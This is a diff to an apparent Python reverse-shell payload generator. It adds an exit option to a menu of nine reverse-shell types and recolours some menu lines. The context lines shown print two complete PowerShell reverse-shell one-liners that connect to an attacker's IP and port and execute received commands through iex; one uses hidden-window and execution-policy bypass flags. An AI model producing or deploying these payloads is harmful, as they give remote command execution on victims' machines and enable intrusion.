@@ -76,6 +76,10 @@ def print_shell(ip,port,choice):
 		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
 		print(Fore.WHITE + f'')
 		print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
+	
+	elif(choice == '0'):
+		print(Fore.RED, "[-] See you later")
+		sys.exit(0)
 		
 	else:
 		print("\n\t\t[-]Wrong Choice")
@@ -90,10 +94,11 @@ def main(ip,port):
 	print(Fore.GREEN +  "[3].PERL REVERSE SHELL\n")
 	print(Fore.YELLOW + "[4].PHP REVERSE SHELL\n")
 	print(Fore.RED +	"[5].RUBY REVERSE SHELL\n")
-	print(Fore.YELLOW + "[6].NETCAT REVERSE SHELL\n")
-	print(Fore.GREEN +  "[7].JAVA REVERSE SHELL\n")
+	print(Fore.GREEN + "[6].NETCAT REVERSE SHELL\n")
+	print(Fore.YELLOW +  "[7].JAVA REVERSE SHELL\n")
 	print(Fore.RED +	"[8].XTERM REVERSE SHELL\n")
-	print(Fore.YELLOW + "[9].POWERSHELL REVERSE SHELL\n")
+	print(Fore.GREEN + "[9].POWERSHELL REVERSE SHELL\n")
+	print(Fore.YELLOW + "[0].EXIT\n")
 	choice = str(input(Fore.RED + "9 Types of Payloads, Choose Wisely:="))
 	print_shell(ip, port, choice)
 	
